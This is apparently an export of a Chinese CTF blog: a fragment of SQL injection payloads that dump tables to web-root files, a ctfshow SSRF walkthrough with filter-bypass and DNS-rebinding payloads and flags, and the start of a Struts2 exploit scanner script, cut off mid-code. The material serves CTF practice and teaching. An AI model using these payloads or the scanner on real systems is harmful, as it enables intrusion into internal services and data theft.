<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27; into outfile &quot;/var/www/html/1.txt&quot;-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;flagdk&#x27; into outfile &quot;/var/www/html/2.txt&quot;-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,group_concat(flag43) from ctfshow.flagdk into outfile &quot;/var/www/html/3.txt&quot;-- -</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_ssrf</title>
    <url>/2023/02/02/ctfshow%E5%90%88%E9%9B%86-ctfshow-ssrf/</url>
    <content><![CDATA[<p>ssrf介绍以及ctfshow_ssrf题</p>
 <span id="more"></span>

<h2 id="1、SSRF漏洞简介："><a href="#1、SSRF漏洞简介：" class="headerlink" title="1、SSRF漏洞简介："></a>1、SSRF<a href="https://javaforall.cn/tag/%E6%BC%8F%E6%B4%9E">漏洞</a>简介：</h2><p>SSRF全称：Server-Side Request Forgery，即，<a href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a>端请求伪造。是一个由攻击者构造请求，在目标服务端执行的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。</p>
<h2 id="2、主要攻击方式："><a href="#2、主要攻击方式：" class="headerlink" title="2、主要攻击方式："></a>2、主要攻击方式：</h2><p>当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的。</p>
<p>DNS协议是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）</p>
 <!--more-->

<h5 id="url格式"><a href="#url格式" class="headerlink" title="url格式"></a>url格式</h5><p><a href="https://baike.baidu.com/item/URL%E6%A0%BC%E5%BC%8F/10056474?fr=aladdin">URL格式_百度百科 (baidu.com)</a></p>
<p>协议类型:&#x2F;&#x2F;服务器地址[:端口号]&#x2F;路径&#x2F;文件名[参数&#x3D;值]。</p>
<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">//这三个函数使用不当会造成ssrfl漏洞</span></span><br></pre></td></tr></table></figure>

<h5 id="curl库"><a href="#curl库" class="headerlink" title="curl库"></a>curl库</h5><p>curl是PHP的一个扩展，利用该扩展可以实现服务器之间的数据或文件传输</p>
<p><a href="https://www.php.net/manual/zh/book.curl.php">https://www.php.net/manual/zh/book.curl.php</a></p>
<h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>用 cURL 函数的基本思想是先使用 <a href="https://www.php.net/manual/zh/function.curl-init.php">curl_init()</a> 初始化 cURL会话，接着可以通过 <a href="https://www.php.net/manual/zh/function.curl-setopt.php">curl_setopt()</a> 设置需要的全部选项，然后使用 <a href="https://www.php.net/manual/zh/function.curl-exec.php">curl_exec()</a> 来执行会话，当执行完会话后使用 <a href="https://www.php.net/manual/zh/function.curl-close.php">curl_close()</a> 关闭会话。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{fa1bbf25-b061-4ed6-bbde-a1c388eb367e}</p>
<h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">/*本函数不是用来验证给定 URL 的有效性的，只是将其分解为下面列出的部分。也会接受不完整或无效的 URL，parse_url() 会尝试尽量正确解析*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<p>parse_url()函数</p>
<p> scheme——如 http  ,         host  ,        port  ,         user       ,      pass       ,    path         ,</p>
<p>  query——在问号 <code>?</code> 之后         .</p>
<p>  fragment——在注释符号 <code>#</code> 之后         </p>
<p><a href="https://www.php.net/manual/zh/function.parse-url">https://www.php.net/manual/zh/function.parse-url</a></p>
<p>上题payload依旧可用</p>
<p><code> </code>ctfshow{2152a6a2-ee73-4272-9d80-7a7bf43591c2}</p>
<h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了local  127.0.   。</p>
<p><code>url=http://0/flag.php</code></p>
<h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>解法一：payload:</p>
<p><code>url=http://r.3hpgmf.ceye.io/flag.php</code></p>
<p>解法二payload:</p>
<p><code>url=http://sudo.cc/flag.phpd</code></p>
<p>解法一和二都是 <strong>DNS Rebinding DNS重绑定</strong>但我不太懂</p>
<p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
<ul>
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
</ul>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">(9条消息) ctfshow ssrf_InvMacKing的博客-CSDN博客</a></p>
<p><strong>dns解析后都是127.0.0.1</strong>  </p>
<p><a href="http://www.ip33.com/dns.html">dns解析网站</a></p>
<p>ctfshow{36fde1d8-aa94-4340-8dd5-297d32bb75c8}</p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=5))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<p>host长度小于五</p>
<p>payload:<code>url=http://127.1/flag.php</code></p>
<p><code>url=http://0/flag.php</code></p>
<p><code> </code>ctfshow{cccbab1c-c78b-486c-b4da-da079ec826ad}</p>
<h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=3))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>url=http://0/flag.php</code></p>
<p>SSRF常见的绕过方式</p>
<p>（一）更改ip地址写法绕过</p>
<p>一些开发者会通过对传递的URL参数进行正则表达式过滤，代码如下</p>
<pre><code>10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$
172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
</code></pre>
<p>这时候，我们可以通过修改进制的方式绕过，如192.168.0.1这个ip地址，就可以改写成</p>
<p>八进制：0300.0250.0.1</p>
<p>十进制整数：3232235521</p>
<p>十六进制&#x2F;整数：0xC0.0xA8.0.1&#x2F;0xC0A80001</p>
<h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]); <span class="comment">//返回 IPv4 地址数组，如果无法解析，则返回 false。hostname</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://r.u77wzd.ceye.io/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{d169ee0a-273f-45a7-b225-89cd7b9b0639}</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>variable</td>
<td>必需。规定要过滤的变量。</td>
</tr>
<tr>
<td>filter</td>
<td>可选。规定要使用的过滤器的 ID。</td>
</tr>
<tr>
<td>options</td>
<td>规定包含标志&#x2F;选项的数组。检查每个过滤器可能的标志和选项。</td>
</tr>
</tbody></table>
<ul>
<li>gethostbyname — 返回主机名对应的 IPv4地址。 </li>
<li>filter_var — 使用特定的过滤器过滤一个变量</li>
<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</li>
<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</li>
<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</li>
<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li>
</ul>
<p><a href="https://blog.csdn.net/ing_end/article/details/124369282">https://blog.csdn.net/ing_end/article/details/124369282</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line"></span><br><span class="line">print_r(parse_url($url));</span><br><span class="line"></span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果Array (</span><br><span class="line"></span><br><span class="line">[scheme] =&gt; http</span><br><span class="line"></span><br><span class="line">[host] =&gt; hostname</span><br><span class="line"></span><br><span class="line">[user] =&gt; username</span><br><span class="line"></span><br><span class="line">[pass] =&gt; password</span><br><span class="line"></span><br><span class="line">[path] =&gt; /path</span><br><span class="line"></span><br><span class="line">[query] =&gt; arg=value</span><br><span class="line"></span><br><span class="line">[fragment] =&gt; anchor</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
<p>正则表达式的意思是以<a href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure>

<p>如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，</p>
<p>ctfshow{4f304e6c-bcfb-4164-bd32-26590444c2b6}</p>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">https://blog.csdn.net/weixin_52240463/article/details/122659261</a></p>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-java</title>
    <url>/2023/04/18/ctfshow%E5%90%88%E9%9B%86-ctfshow-java/</url>
    <content><![CDATA[<p>​    ctfshow-java</p>
 <span id="more"></span>



<p><a href="https://github.com/Vancomycin-g/Struts2Scan">https://github.com/Vancomycin-g/Struts2Scan</a></p>
<p>改良版的</p>
<p>或者用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import shlex</span><br><span class="line">import random</span><br><span class="line">import base64</span><br><span class="line">import copy</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">import click</span><br><span class="line">import requests</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.error</span><br><span class="line">import time</span><br><span class="line">from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout</span><br><span class="line">from urllib.parse import quote, unquote</span><br><span class="line">from functools import partial</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from concurrent import futures</span><br><span class="line"> </span><br><span class="line">__title__ = &#x27;Struts2 Scan&#x27;</span><br><span class="line">__version__ = &#x27;0.1&#x27;</span><br><span class="line">__author__ = &#x27;HatBoy&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下：</span><br><span class="line">S2-001,S2-003,S2-005,S2-007,S2-008,S2-009,S2-012,S2-013,S2-015,S2-016,S2-019,</span><br><span class="line">S2-029,S2-032,S2-033,S2-037,S2-045,S2-046,S2-048,S2-052,S2-053,S2-devMode</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">default_headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"># 全局代理</span><br><span class="line">proxies = None</span><br><span class="line"># 超时时间</span><br><span class="line">_tiemout = 10</span><br><span class="line"># 默认输出所有结果，包括不存在漏洞的</span><br><span class="line">is_quiet = False</span><br><span class="line"># 进程数</span><br><span class="line">process = 10</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GET请求发送包装&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = get_stream(url, headers, encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_302(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GET请求发送包装&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=False)</span><br><span class="line">        status_code = html.status_code</span><br><span class="line">        if status_code == 302:</span><br><span class="line">            html = html.headers.get(&quot;Location&quot;, &quot;&quot;)</span><br><span class="line">        elif status_code == 200:</span><br><span class="line">            html = html.content.decode(encoding)</span><br><span class="line">            html = html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">        else:</span><br><span class="line">            html = &quot;&quot;</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_stream(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;分块接受数据&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.get(url, headers=headers, timeout=_tiemout, stream=True, proxies=proxies)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            if b&#x27;\x00&#x27; in line:</span><br><span class="line">                break</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return 